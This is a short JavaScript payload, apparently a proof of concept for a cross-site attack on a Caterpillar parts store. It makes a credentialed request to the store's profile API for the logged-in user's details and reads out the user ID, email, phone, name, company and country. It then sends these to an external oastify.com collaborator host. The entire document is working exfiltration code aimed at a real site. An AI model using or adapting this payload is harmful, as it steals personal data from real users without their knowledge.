fetch('https://parts.cat.com/wcs/resources/store/20203/person/@self?responseFormat=json',{credentials:'include'})
.then(r=>r.json())
.then(d=>{
  const essentials = {
    userId: d.userId,
    email: d.email1,
    phone: d.phone1,
    name: d.firstName + ' ' + d.lastName,
    company: d.companyName,
    country: d.country
  }
  return fetch('https://cr70ebszwf06lp7i0msf30hmwd24qwlka.oastify.com/?data='+encodeURIComponent(JSON.stringify(essentials)))
})
.catch(e=>console.log('Error:',e.message))
